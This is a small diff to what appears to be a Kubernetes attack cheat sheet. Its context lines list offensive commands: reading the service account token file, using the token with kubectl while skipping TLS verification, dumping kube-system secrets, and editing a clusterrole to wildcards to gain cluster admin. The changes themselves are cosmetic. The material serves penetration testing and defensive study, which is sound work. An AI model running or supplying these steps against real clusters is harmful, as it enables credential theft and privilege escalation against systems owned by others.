@@ -47,7 +47,7 @@ _/ ___\ |  |  \ _/ __ \ \__  \ \   __\     /  ___/|  |  \ _/ __ \_/ __ \\   __\
 - cat /var/run/secrets/kubernetes.io/serviceaccount/token
    - ( view service account token! )
    
-- kubectl --insecure-skip-tls-verify -shttps://[IP]:PORT/ --token="[TOKEN]" -n kube-system get pods
+- kubectl --insecure-skip-tls-verify -shttps://[IP]:PORT/ --token="[TOKEN]" -n kube-system get pods 
    - ( RCE with compromised SA token )
    
 - kubectl create [POD-MANIFEST].yml
@@ -63,13 +63,14 @@ _/ ___\ |  |  \ _/ __ \ \__  \ \   __\     /  ___/|  |  \ _/ __ \_/ __ \\   __\
    - ( list secrets )
    
 - kubectl -n kube-system get secret [SECRET-NAME] -o json
-   - (abuse 'get secrets' permissions )
+   - (abuse 'GET SECRETS' sa permission )
 
 - kubectl --token=[SA-TOKEN] get clusterroles
 - kubectl --token=[SA-TOKEN] edit clusterrole <SA-CLUSTER-ROLE-NAME>
-   - ( abuse 'escalate' permissions )
+   - ( abuse 'ESCALATE' sa permissions )
    - ( when editing, put '*' under API groups, resources, and verbs )
    - ( this effectively makes you cluster admin! )
+
    
 ------------------------------------------------------------------------------------------------------------------------------------
                                             ports
